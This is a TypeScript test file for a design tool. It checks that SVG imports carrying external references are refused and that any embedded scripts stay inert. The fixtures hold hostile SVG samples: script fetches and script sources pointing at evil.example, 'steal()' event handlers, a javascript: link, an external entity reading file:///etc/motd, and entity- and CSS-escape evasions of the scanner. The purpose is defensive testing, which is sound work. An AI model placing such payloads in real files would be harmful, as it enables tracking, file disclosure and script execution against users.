/**
 * Imported vectors are inert (#214, spec #207 US-006, DEC-007, TEST-005).
 *
 * Two seams:
 *
 * 1. The CLI subprocess seam for the ingestion refusal: an SVG referencing
 *    anything outside itself (remote or local image via either href spelling,
 *    font, stylesheet, out-of-file use target — across case, whitespace, and
 *    entity encodings, plus DOCTYPE external identifiers and foreignObject
 *    content) is refused at the one image ingestion point, naming EACH
 *    reference and the fix (embed the resource as a data URI), and the
 *    refusal leaves nothing published. Data URIs and same-document fragments
 *    are accepted. A script never blocks import.
 *
 * 2. The render page's request log for the inertness proof: a script-only
 *    SVG imports, and rendering, measuring, reviewing, and replaying it
 *    produce zero network requests and no script side effect. The four
 *    operations run through the exact library entry points the CLI commands
 *    call, in-process, so the shared render page's request log (src/browser.ts)
 *    is observable; a CLI subprocess render proves the shipped command path
 *    end-to-end on the same file.
 *
 * TEST-007: runnable under the per-file `bun test --isolate` topology and
 * fully offline — every network route that would carry a reference is a
 * refusal or never fires; nothing fetches.
 */
import { expect, test, beforeEach, afterEach } from "bun:test";
import path from "node:path";
import { mkdtemp, rm, readdir, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { decodePng } from "../src/png.js";
import { encodePng } from "./png.js";
import { renderComposition, replayRender } from "../src/composition-render.js";
import { measureCompositionLayers } from "../src/composition-measure.js";
import { reviewRetainedLayer } from "../src/evidence-review.js";
import {
  withRenderPage,
  renderPageNetworkRequests,
  clearRenderPageRequests,
  closeBrowser,
} from "../src/browser.js";

const cli = path.resolve(import.meta.dir, "../src/cli.ts");

async function invoke(args: string[]) {
  const result = Bun.spawn([process.execPath, cli, ...args], {
    cwd: path.resolve(import.meta.dir, ".."),
    stdout: "pipe",
    stderr: "pipe",
  });
  const [stdout, stderr, code] = await Promise.all([
    new Response(result.stdout).text(),
    new Response(result.stderr).text(),
    result.exited,
  ]);
  return { stdout, stderr, code };
}

let tempDir: string;
let projDir: string;

beforeEach(async () => {
  tempDir = await mkdtemp(path.join(tmpdir(), "ply-svg-inert-"));
  projDir = path.join(tempDir, "proj");
  await invoke(["project", "init", projDir, "--name", "inert-proj"]);
  await invoke([
    "composition", "create", "poster", "--width", "200", "--height", "120", "--project", projDir,
  ]);
});

afterEach(async () => {
  await closeBrowser().catch(() => {});
  if (tempDir) {
    await rm(tempDir, { recursive: true, force: true });
  }
});

/** Every file under root, keyed by relative path, valued by base64 bytes. */
async function snapshotTree(root: string): Promise<Record<string, string>> {
  const out: Record<string, string> = {};
  async function walk(dir: string, prefix: string): Promise<void> {
    for (const e of (await readdir(dir, { withFileTypes: true })).sort((a, b) => a.name.localeCompare(b.name))) {
      const rel = prefix ? `${prefix}/${e.name}` : e.name;
      const abs = path.join(dir, e.name);
      if (e.isDirectory()) {
        await walk(abs, rel);
      } else {
        out[rel] = (await readFile(abs)).toString("base64");
      }
    }
  }
  await walk(root, "");
  return out;
}

/** A minimal well-formed SVG with a declared intrinsic size. */
function baseSvg(body: string, extra = ""): string {
  return (
    `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" ` +
    `width="80" height="40" viewBox="0 0 80 40" ${extra}>${body}</svg>`
  );
}

/** Add `svg` under `name`; expect the import refusal naming every listed
 *  needle and the fix needle (default: the data-URI fix), with the live
 *  Project byte-identical. */
async function expectAddRefused(
  svg: string,
  name: string,
  needles: string[],
  fixNeedle = "data URI",
): Promise<void> {
  const svgPath = path.join(tempDir, name);
  await writeFile(svgPath, svg);
  const before = await snapshotTree(projDir);
  const add = await invoke([
    "composition", "add", "poster", "logo", "--image", svgPath, "--project", projDir, "--json",
  ]);
  expect(add.code).toBe(1);
  const json = JSON.parse(add.stdout);
  expect(json.ok).toBe(false);
  for (const needle of needles) {
    expect(json.error).toContain(needle);
  }
  expect(json.error).toContain(fixNeedle);
  // The refusal leaves nothing published: the Project tree (compositions,
  // content store, records) is byte-identical to before the attempt.
  expect(await snapshotTree(projDir)).toEqual(before);
}


/** One pixel's RGBA from a decoded PNG. */
function pixel(
  png: ReturnType<typeof decodePng>,
  x: number,
  y: number,
): [number, number, number, number] {
  const i = (y * png.width + x) * 4;
  return [png.rgba[i]!, png.rgba[i + 1]!, png.rgba[i + 2]!, png.rgba[i + 3]!];
}

// ---------------------------------------------------------------------------
// The external-reference refusal, per reference category (US-006 bullet 2)
// ---------------------------------------------------------------------------

test("a remote or local image reference via either href spelling is refused, naming each reference", async () => {
  await expectAddRefused(
    baseSvg(
      `<rect width="80" height="40" fill="#ff0000"/>` +
        `<image href="https://evil.example/pic.png" x="0" y="0" width="10" height="10"/>` +
        `<image xlink:href="photo.png" x="20" y="0" width="10" height="10"/>` +
        `<use href="icons.svg#dot"/>`,
    ),
    "images.svg",
    [
      "https://evil.example/pic.png",
      "photo.png",
      "icons.svg#dot",
      "use target outside the file",
      "href on <image>",
      "line 1",
    ],
  );
});

test("case and whitespace variations of href cannot slip past the scan", async () => {
  await expectAddRefused(
    baseSvg(
      `<rect width="80" height="40" fill="#ff0000"/>` +
        `<image HREF = "https://evil.example/a.png" width="10" height="10"/>` +
        `<image XLINK:HREF='b.png' width="10" height="10"/>`,
    ),
    "case.svg",
    ["https://evil.example/a.png", "b.png"],
  );
});

test("entity-encoded hrefs are decoded before the verdict", async () => {
  // Numeric character references spelling "https" — the browser would decode
  // the attribute value, so the scan decodes it first.
  await expectAddRefused(
    baseSvg(
      `<rect width="80" height="40" fill="#ff0000"/>` +
        `<image xlink:href="&#104;ttps://evil.example/pic.png" width="10" height="10"/>`,
    ),
    "entity.svg",
    ["https://evil.example/pic.png"],
  );
  // A custom entity's replacement text is unknowable — and any DOCTYPE
  // entity declaration is refused on its own (a conformant XML parser
  // expands internal entities, so entity expansion to markup cannot be
  // judged at text level).
  await expectAddRefused(
    `<?xml version="1.0"?>\n` +
      `<!DOCTYPE svg [\n  <!ENTITY logo "https://evil.example/logo.png">\n]>\n` +
      baseSvg(
        `<rect width="80" height="40" fill="#ff0000"/>` +
          `<image href="&logo;" width="10" height="10"/>`,
      ),
    "custom-entity.svg",
    ["DOCTYPE entity declaration", "logo"],
    "remove the DOCTYPE's entity declarations",
  );
});

test("a font reference inside a style sheet is refused", async () => {
  await expectAddRefused(
    baseSvg(
      `<style>@font-face { font-family: Brand; src: url(fonts/brand.woff2); }</style>` +
        `<rect width="80" height="40" fill="#ff0000"/>`,
    ),
    "font.svg",
    ["fonts/brand.woff2", "font reference (@font-face src)"],
  );
});

test("stylesheet references — @import, CSS url(), link, and the xml-stylesheet PI — are refused", async () => {
  await expectAddRefused(
    baseSvg(
      `<style>@import "theme.css"; rect { fill: url(bg.png); }</style>` +
        `<rect width="80" height="40"/>`,
    ),
    "import.svg",
    ["theme.css", "bg.png", "@import", "CSS url()"],
  );
  await expectAddRefused(
    baseSvg(`<link rel="stylesheet" href="theme.css"/><rect width="80" height="40"/>`),
    "link.svg",
    ["theme.css", "href on <link>"],
  );
  await expectAddRefused(
    `<?xml version="1.0"?>\n<?xml-stylesheet type="text/css" href="theme.css"?>\n` +
      baseSvg(`<rect width="80" height="40"/>`),
    "pi.svg",
    ["theme.css", "xml-stylesheet"],
  );
  // url() inside a style ATTRIBUTE counts the same as a style sheet.
  await expectAddRefused(
    baseSvg(
      `<foreignObject width="80" height="40"><body xmlns="http://www.w3.org/1999/xhtml">` +
        `<div style="background-image: url(https://evil.example/bg.png)">x</div>` +
        `</body></foreignObject>`,
    ),
    "style-attr.svg",
    ["https://evil.example/bg.png", "CSS url()"],
  );
});

test("any DOCTYPE entity declaration — internal or external — is refused, naming the fix", async () => {
  // A conformant XML parser expands internal entities, so entity expansion
  // to markup (`&x;` delivering an <image> element) cannot be judged at text
  // level. Without DOCTYPE entities there is nothing to expand.
  await expectAddRefused(
    `<!DOCTYPE svg [\n  <!ENTITY x "<image href='http://e/x.png'/>">\n]>\n` +
      baseSvg(`<rect width="80" height="40" fill="#ff0000"/>&x;`),
    "entity-markup.svg",
    ["DOCTYPE entity declaration", "x"],
    "remove the DOCTYPE's entity declarations",
  );
  await expectAddRefused(
    `<!DOCTYPE svg [\n  <!ENTITY logo SYSTEM "file:///etc/motd">\n]>\n` +
      baseSvg(`<rect width="80" height="40"/>`),
    "entity-decl.svg",
    ["logo", "DOCTYPE entity declaration"],
    "remove the DOCTYPE's entity declarations",
  );
  await expectAddRefused(
    `<!DOCTYPE svg [\n  <!ENTITY % pe PUBLIC "-//x//y" "http://evil.example/pe.dtd">\n]>\n` +
      baseSvg(`<rect width="80" height="40"/>`),
    "parameter-entity.svg",
    ["pe", "DOCTYPE entity declaration"],
    "remove the DOCTYPE's entity declarations",
  );
  // The conventional SVG 1.1 prolog every design tool emits names the
  // document's own type definition — not an entity declaration, not a
  // rendered resource, never fetched in the browser's image path — so it
  // imports.
  const svgPath = path.join(tempDir, "conventional-prolog.svg");
  await writeFile(
    svgPath,
    `<?xml version="1.0" encoding="UTF-8" standalone="no"?>\n` +
      `<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n` +
      baseSvg(`<rect width="80" height="40" fill="#ff0000"/>`),
  );
  const add = await invoke([
    "composition", "add", "poster", "logo", "--image", svgPath, "--project", projDir, "--json",
  ]);
  expect(add.code).toBe(0);
  expect(JSON.parse(add.stdout).ok).toBe(true);
});

test("a paint-server url() on any presentation attribute is refused; url(#fragment) is not", async () => {
  // The canonical external paint-server reference — fill, stroke, filter,
  // mask, and clip-path all carry url() values the scan judges on every
  // element.
  await expectAddRefused(
    baseSvg(
      `<rect width="80" height="40" fill="url(https://evil.example/g.svg#g)"/>`,
    ),
    "fill-url.svg",
    ["https://evil.example/g.svg#g", "CSS url() in fill attribute on <rect>"],
  );
  await expectAddRefused(
    baseSvg(
      `<rect width="80" height="40" stroke="url(strokes.svg#s)" filter="url(https://evil.example/f.svg#f)"/>`,
    ),
    "paint-attrs.svg",
    ["strokes.svg#s", "https://evil.example/f.svg#f"],
  );
});

test("srcset candidates are judged separately", async () => {
  // A fragment- or data:-first list cannot smuggle a remote candidate past
  // the gate.
  await expectAddRefused(
    baseSvg(
      `<foreignObject width="80" height="40"><body xmlns="http://www.w3.org/1999/xhtml">` +
        `<img srcset="data:image/png;base64,iVBORw0KGgo= 1x, https://evil.example/x.png 2x"/>` +
        `</body></foreignObject>`,
    ),
    "srcset-mixed.svg",
    ["https://evil.example/x.png", "srcset candidate on <img>"],
  );
  await expectAddRefused(
    baseSvg(
      `<foreignObject width="80" height="40"><body xmlns="http://www.w3.org/1999/xhtml">` +
        `<img srcset="#a 1x, ../evil.png 2x"/>` +
        `</body></foreignObject>`,
    ),
    "srcset-fragment-first.svg",
    ["../evil.png"],
  );
});

test("CSS escapes and CDATA splits cannot hide a keyword or target", async () => {
  // CSS unescapes backslash sequences exactly as the tokenizer does —
  // AFTER the XML entity decode and BEFORE url()/@import matching — so the
  // escape-decoded keyword is matched.
  await expectAddRefused(
    baseSvg(`<style>@\\69 mport "https://evil.example/evil.css";</style>`),
    "css-escape.svg",
    ["https://evil.example/evil.css", "@import in <style> body"],
  );
  // Entity-encoded backslash + hex digit: same normalization pipeline.
  await expectAddRefused(
    baseSvg(`<style>@&#92;69 mport "https://evil.example/evil.css";</style>`),
    "css-escape-entity.svg",
    ["https://evil.example/evil.css"],
  );
  // A CSS-escaped url() keyword inside a presentation attribute.
  await expectAddRefused(
    baseSvg(`<rect width="80" height="40" fill="u\\72 l(https://evil.example/g.svg#g)"/>`),
    "attr-css-escape.svg",
    ["https://evil.example/g.svg#g"],
  );
  // XML joins CDATA into the style body's character data — the scan joins
  // it before matching, so the split keyword is still matched.
  await expectAddRefused(
    baseSvg(`<style>@imp<![CDATA[ort "https://evil.example/evil.css"]]></style>`),
    "cdata-split.svg",
    ["https://evil.example/evil.css", "@import in <style> body"],
  );
});

test("an unterminated comment, CDATA section, script, style, PI, or tag refuses as malformed", async () => {
  const cases: Array<[string, string, string]> = [
    ["unterminated-comment.svg", baseSvg(`<rect width="80" height="40"/>`) + "\n<!-- never closed", "unterminated <!-- comment"],
    ["unterminated-cdata.svg", baseSvg(`<style>fill: <![CDATA[never closed</style>`), "unterminated CDATA section"],
    ["unterminated-script.svg", baseSvg(`<script>window.x = 1;`), "a <script> element"],
    ["unterminated-style.svg", baseSvg(`<style>rect { fill: #f00;`), "a <style> element"],
    ["unterminated-pi.svg", baseSvg(`<rect width="80" height="40"/>`) + `\n<?xml-stylesheet type="text/css" href="theme.css"`, "a processing instruction"],
    ["unterminated-doctype.svg", baseSvg(`<rect width="80" height="40"/>`) + `\n<!DOCTYPE svg SYSTEM "http://evil.example/x.dtd"`, "<!DOCTYPE declaration is unterminated"],
    ["unterminated-tag.svg", baseSvg(`<rect width="80" height="40"/>`) + `\n<image href="pic.png" width="10"`, "a <image> start tag"],
  ];
  for (const [name, content, needle] of cases) {
    const svgPath = path.join(tempDir, name);
    await writeFile(svgPath, content);
    const add = await invoke([
      "composition", "add", "poster", "logo", "--image", svgPath, "--project", projDir, "--json",
    ]);
    expect(add.code).toBe(1);
    const error = JSON.parse(add.stdout).error as string;
    // The scan refuses the unterminated construct as malformed; the identity
    // gate may refuse a prolog-terminated file first — either refusal is the
    // fail-fast answer, and both are actionable, never a crash.
    expect(error).toMatch(/not a valid SVG document|not an SVG document|Malformed SVG|truncated/);
    expect(error).toContain(needle);
  }
});

test("a nested data:image/svg+xml payload is re-scanned once", async () => {
  // The inner document's external reference is named — the gate does not
  // trust recursive image-mode blocking.
  const dot = encodePng(8, 8, () => [255, 0, 0, 255]);
  const inner = baseSvg(
    `<rect width="80" height="40" fill="#ff0000"/>` +
      `<image href="https://evil.example/inner.png" width="10" height="10"/>`,
  );
  await expectAddRefused(
    baseSvg(`<image href="data:image/svg+xml;base64,${Buffer.from(inner).toString("base64")}" width="40" height="20"/>`),
    "nested-remote.svg",
    ["https://evil.example/inner.png", "nested data:image/svg+xml: href on <image>"],
  );
  // Percent-encoded (non-base64) inner payloads are re-scanned too.
  await expectAddRefused(
    baseSvg(
      `<image href="data:image/svg+xml,${encodeURIComponent(inner)}" width="40" height="20"/>`,
    ),
    "nested-remote-raw.svg",
    ["https://evil.example/inner.png"],
  );
  // A nested SVG with only inert references imports.
  const clean = baseSvg(`<rect width="80" height="40" fill="url(#g)"/><image href="data:image/png;base64,${dot.toString("base64")}"/>`);
  const svgPath = path.join(tempDir, "nested-clean.svg");
  await writeFile(
    svgPath,
    baseSvg(
      `<image href="data:image/svg+xml;base64,${Buffer.from(clean).toString("base64")}" width="40" height="20"/>`,
    ),
  );
  const add = await invoke([
    "composition", "add", "poster", "logo", "--image", svgPath, "--project", projDir, "--json",
  ]);
  expect(add.code).toBe(0);
  expect(JSON.parse(add.stdout).ok).toBe(true);
});

test("the xml-stylesheet PI without a href refuses on doubt, never crashes", async () => {
  // INT-1: the no-href PI and an unquoted href are actionable refusals, not
  // an internal TypeError.
  await expectAddRefused(
    `<?xml-stylesheet type="text/css"?>\n` + baseSvg(`<rect width="80" height="40"/>`),
    "pi-no-href.svg",
    ["xml-stylesheet reference", "(no href"],
  );
  await expectAddRefused(
    `<?xml-stylesheet type="text/css" href=theme.css?>\n` + baseSvg(`<rect width="80" height="40"/>`),
    "pi-unquoted.svg",
    ["theme.css"],
  );
});

test("plain text content and url()-like names are not references", async () => {
  // Must not false-refuse: text mentioning a URL is text; "bgurl(" is not a
  // url( token; a comment is not markup.
  const svgPath = path.join(tempDir, "plain-text.svg");
  await writeFile(
    svgPath,
    baseSvg(
      `<desc>docs live at https://example.com and see url(https://example.com) in prose</desc>` +
        `<rect class="bgurl(x)" width="80" height="40" fill="#ff0000"/>` +
        `<!-- <image href="https://evil.example/pic.png"/> -->`,
    ),
  );
  const add = await invoke([
    "composition", "add", "poster", "logo", "--image", svgPath, "--project", projDir, "--json",
  ]);
  expect(add.code).toBe(0);
  expect(JSON.parse(add.stdout).ok).toBe(true);
});

test("foreignObject content referencing a remote image is refused", async () => {
  await expectAddRefused(
    baseSvg(
      `<foreignObject width="80" height="40"><body xmlns="http://www.w3.org/1999/xhtml">` +
        `<img src="https://evil.example/pic.png" width="80" height="40"/>` +
        `</body></foreignObject>`,
    ),
    "foreign-object.svg",
    ["https://evil.example/pic.png", "src on <img>"],
  );
});

test("a script does not suppress the scan: a file with a script AND a remote reference is refused", async () => {
  // The TEST-005-shaped artifact: one crafted file with both a script and a
  // remote reference. The script body is skipped, the walk resumes, and the
  // reference after it is still refused by name.
  await expectAddRefused(
    baseSvg(
      `<script>fetch("https://evil.example/call.js");</script>` +
        `<rect width="80" height="40" fill="#ff0000"/>` +
        `<image href="https://evil.example/pic.png" width="10" height="10"/>`,
      `onload="steal()"`,
    ),
    "script-and-ref.svg",
    ["https://evil.example/pic.png", "href on <image>"],
  );
  // The same with the reference BEFORE the script.
  await expectAddRefused(
    baseSvg(
      `<image href="https://evil.example/pic.png" width="10" height="10"/>` +
        `<script>window.x = 1;</script>`,
    ),
    "ref-then-script.svg",
    ["https://evil.example/pic.png"],
  );
});

async function expectAddAccepted(svg: string, name: string): Promise<void> {
  const svgPath = path.join(tempDir, name);
  await writeFile(svgPath, svg);
  const add = await invoke([
    "composition", "add", "poster", "logo", "--image", svgPath, "--project", projDir, "--json",
  ]);
  expect(add.code).toBe(0);
  expect(JSON.parse(add.stdout).ok).toBe(true);
}

test("a script element never blocks import — inline, src, event handlers, either spelling", async () => {
  await expectAddAccepted(
    baseSvg(
      `<script src="https://evil.example/x.js"></script>` +
        `<script src="https://evil.example/y.js"/>` +
        `<rect width="80" height="40" fill="#ff0000" onclick="steal()"/>`,
      `onload="steal()"`,
    ),
    "script-src.svg",
  );
});

test("foreignObject resource attributes — srcset, data, base, poster — are refused", async () => {
  await expectAddRefused(
    baseSvg(
      `<foreignObject width="80" height="40"><body xmlns="http://www.w3.org/1999/xhtml">` +
        `<img srcset="a.png 1x, https://evil.example/b.png 2x"/>` +
        `<object data="https://evil.example/o.bin"/>` +
        `<video poster="https://evil.example/p.jpg"/>` +
        `<base href="https://evil.example/"/>` +
        `</body></foreignObject>`,
    ),
    "foreign-attrs.svg",
    ["https://evil.example/b.png", "https://evil.example/o.bin", "https://evil.example/p.jpg", "https://evil.example/"],
  );
});

test("the refusal lists the first 20 references and reports the remainder", async () => {
  const images = Array.from({ length: 25 }, (_, i) => `<image href="pic-${i}.png" width="2" height="2"/>`).join("");
  const svgPath = path.join(tempDir, "many-refs.svg");
  await writeFile(svgPath, baseSvg(`<rect width="80" height="40"/>${images}`));
  const add = await invoke([
    "composition", "add", "poster", "logo", "--image", svgPath, "--project", projDir, "--json",
  ]);
  expect(add.code).toBe(1);
  const error = JSON.parse(add.stdout).error as string;
  expect(error).toContain("pic-0.png");
  expect(error).toContain("pic-19.png");
  expect(error).not.toContain("pic-20.png");
  expect(error).toContain("...and 5 more reference(s)");
});

test("same-document fragments and embedded data URIs are accepted", async () => {
  const dot = encodePng(8, 8, () => [255, 0, 0, 255]);
  const svg = baseSvg(
    `<defs><circle id="dot" cx="20" cy="20" r="8" fill="#00ff00"/></defs>` +
      `<rect width="2" height="2" fill="url(#dot)"/>` +
      `<rect width="80" height="40" fill="#ff0000"/>` +
      `<use href="#dot"/>` +
      `<image href="DATA:image/png;base64,${dot.toString("base64")}" x="40" y="10" width="20" height="20"/>`,
  );
  const svgPath = path.join(tempDir, "embedded.svg");
  await writeFile(svgPath, svg);
  const add = await invoke([
    "composition", "add", "poster", "logo", "--image", svgPath, "--x", "50", "--y", "30",
    "--project", projDir, "--json",
  ]);
  expect(add.code).toBe(0);
  const addJson = JSON.parse(add.stdout);
  expect(addJson.ok).toBe(true);
  expect(addJson.layer.currentRevision.format).toBe("svg");

  const render = await invoke(["composition", "render", "poster", "--project", projDir, "--json"]);
  expect(render.code).toBe(0);
  const png = decodePng(await readFile(JSON.parse(render.stdout).render.output));
  // The internal fragment reference painted: the circle is green.
  expect(pixel(png, 70, 50).slice(0, 3)).toEqual([0, 255, 0]);
  // The embedded data URI painted: the image element's pixels are red.
  expect(pixel(png, 90, 50).slice(0, 3)).toEqual([255, 0, 0]);
});

// ---------------------------------------------------------------------------
// A script never blocks import (US-006 bullet 3)
// ---------------------------------------------------------------------------

/** A script-only SVG: an inline script, a remote-src script, event handlers,
 *  a javascript: href, and a URL that appears only inside a comment (not a
 *  reference). Everything here is scan-accepted and must never run or fetch. */
function scriptOnlySvg(): string {
  return baseSvg(
    `<script>window.__plyVectorScriptRan = true;</script>` +
      `<script src="https://evil.example/tracker.js"></script>` +
      `<rect width="80" height="40" fill="#ff0000" onclick="window.__plyVectorOnclick = true"/>` +
      `<a href="javascript:window.__plyVectorJs = true"><rect x="10" y="10" width="20" height="20" fill="#0000ff"/></a>`,
    `onload="window.__plyVectorOnload = true"`,
  ) + `\n<!-- <image href="https://evil.example/pic.png"/> -->\n`;
}

test("a script-only SVG imports, and its CLI render publishes a real image", async () => {
  const svgPath = path.join(tempDir, "script-only.svg");
  await writeFile(svgPath, scriptOnlySvg());
  const add = await invoke([
    "composition", "add", "poster", "logo", "--image", svgPath, "--x", "50", "--y", "30",
    "--project", projDir, "--json",
  ]);
  expect(add.code).toBe(0);
  const addJson = JSON.parse(add.stdout);
  expect(addJson.ok).toBe(true);

  const render = await invoke(["composition", "render", "poster", "--project", projDir, "--json"]);
  expect(render.code).toBe(0);
  const png = decodePng(await readFile(JSON.parse(render.stdout).render.output));
  expect(png.width).toBe(200);
  expect(png.height).toBe(120);
  // The vector painted: red field, blue square — the scripts contributed
  // nothing and removed nothing.
  expect(pixel(png, 115, 65).slice(0, 3)).toEqual([255, 0, 0]);
  expect(pixel(png, 70, 50).slice(0, 3)).toEqual([0, 0, 255]);
});

// ---------------------------------------------------------------------------
// The inertness proof through the render page's request log (TEST-005)
// ---------------------------------------------------------------------------

test("render, measure, review, and replay of a script-only SVG issue zero network requests and run no script", async () => {
  const svgPath = path.join(tempDir, "script-only.svg");
  await writeFile(svgPath, scriptOnlySvg());
  const add = await invoke([
    "composition", "add", "poster", "logo", "--image", svgPath, "--x", "50", "--y", "30",
    "--project", projDir, "--json",
  ]);
  expect(add.code).toBe(0);
  const layerId = (JSON.parse(add.stdout).use.layerId as string);

  // Render in-process — the exact library entry point `composition render`
  // calls — on the shared render page whose request log this test reads.
  clearRenderPageRequests();
  const rendered = await renderComposition(projDir, "poster", { supersample: 1 });
  expect(renderPageNetworkRequests()).toEqual([]);
  const painted = decodePng(await readFile(rendered.output));
  expect(pixel(painted, 115, 65).slice(0, 3)).toEqual([255, 0, 0]);
  expect(pixel(painted, 70, 50).slice(0, 3)).toEqual([0, 0, 255]);

  // No script side effect on the page that painted the vector.
  await withRenderPage(async (page) => {
    const markers = await page.evaluate(() => ({
      script: (window as unknown as Record<string, unknown>).__plyVectorScriptRan ?? null,
      onclick: (window as unknown as Record<string, unknown>).__plyVectorOnclick ?? null,
      onload: (window as unknown as Record<string, unknown>).__plyVectorOnload ?? null,
      js: (window as unknown as Record<string, unknown>).__plyVectorJs ?? null,
    }));
    expect(markers).toEqual({ script: null, onclick: null, onload: null, js: null });
  });

  // Measure — the exact library entry point `composition measure` calls.
  clearRenderPageRequests();
  const measured = await measureCompositionLayers(projDir, "poster");
  expect(measured.layers[0]!.painted).not.toBeNull();
  expect(renderPageNetworkRequests()).toEqual([]);

  // Review — `layer review` of a plain imported Layer is refused at its
  // pre-existing lineage gate (no generation or matte claims it), which
  // touches no browser: this leg proves the refusal happens before any
  // request could exist, NOT that a sheet rendered. A rendered review sheet
  // is data-URI-only HTML by construction (CSP default-src 'none').
  clearRenderPageRequests();
  let reviewError = "";
  try {
    await reviewRetainedLayer(projDir, layerId, path.join(tempDir, "review.html"));
  } catch (err) {
    reviewError = (err as Error).message;
  }
  expect(reviewError).toContain("not generated or matted content");
  expect(renderPageNetworkRequests()).toEqual([]);

  // Replay — the exact library entry point `composition replay` calls, on a
  // manifest captured by the CLI subprocess render above (same environment
  // identity). The replay paints from the retained bytes alone.
  const cliRender = await invoke(["composition", "render", "poster", "--project", projDir, "--json"]);
  expect(cliRender.code).toBe(0);
  const manifestPath = JSON.parse(cliRender.stdout).render.manifest as string;
  const cliOutputPath = JSON.parse(cliRender.stdout).render.output as string;
  clearRenderPageRequests();
  const replayed = await replayRender(projDir, manifestPath);
  expect(renderPageNetworkRequests()).toEqual([]);
  // Replay is byte-identical to the render that captured the manifest.
  expect((await readFile(replayed.output)).equals(await readFile(cliOutputPath))).toBe(true);
});

test("an edit-time external-reference refusal leaves the Layer's live state unchanged", async () => {
  const pngPath = path.join(tempDir, "plain.png");
  await writeFile(pngPath, encodePng(16, 16, () => [10, 200, 30, 255]));
  const add = await invoke([
    "composition", "add", "poster", "photo", "--image", pngPath, "--project", projDir, "--json",
  ]);
  expect(add.code).toBe(0);
  const layerId = JSON.parse(add.stdout).use.layerId as string;
  const inspectBefore = await invoke(["layer", "inspect", layerId, "--project", projDir, "--json"]);
  const before = JSON.parse(inspectBefore.stdout);

  const evil = path.join(tempDir, "evil-edit.svg");
  await writeFile(
    evil,
    baseSvg(
      `<rect width="80" height="40" fill="#ff0000"/>` +
        `<image href="https://evil.example/pic.png" width="10" height="10"/>`,
    ),
  );
  const edit = await invoke(["layer", "edit", layerId, "--image", evil, "--project", projDir, "--json"]);
  expect(edit.code).toBe(1);
  expect(JSON.parse(edit.stdout).error).toContain("https://evil.example/pic.png");

  const inspectAfter = await invoke(["layer", "inspect", layerId, "--project", projDir, "--json"]);
  expect(JSON.parse(inspectAfter.stdout).layer.currentRevisionId).toBe(
    before.layer.currentRevisionId,
  );
  expect(JSON.parse(inspectAfter.stdout).layer.currentRevision.format).toBe("png");
});